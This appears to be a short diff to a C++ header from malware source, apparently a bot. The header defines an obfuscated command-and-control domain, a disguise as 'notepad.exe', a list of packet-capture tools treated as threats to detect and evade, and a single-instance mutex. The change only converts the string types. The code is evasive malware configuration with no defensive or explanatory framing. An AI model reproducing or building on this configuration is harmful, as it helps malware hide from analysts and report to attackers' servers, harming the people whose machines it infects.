@@ -1,16 +1,16 @@
 #pragma once
 #include "obfuscate.h"
-const char* CNC_DOMAINS[] = {
-	OBFUSCATE("aloncnc.com")
+const std::string CNC_DOMAINS[] = {
+	std::string(OBFUSCATE("aloncnc.com"))
 };
 
 #define PROCESS_NAME OBFUSCATE("notepad.exe")
 
-const char* THREAT_PROCESSES[] = {
-	OBFUSCATE("wireshark.exe"),
-	OBFUSCATE("tcpdump.exe"),
-	OBFUSCATE("tshark.exe"),
-	OBFUSCATE("netcap.exe")
+const std::string THREAT_PROCESSES[] = {
+	std::string(OBFUSCATE("wireshark.exe")),
+	std::string(OBFUSCATE("tcpdump.exe")),
+	std::string(OBFUSCATE("tshark.exe")),
+	std::string(OBFUSCATE("netcap.exe"))
 };
 const char* MUTEX_NAME = "identity_mutex";
 
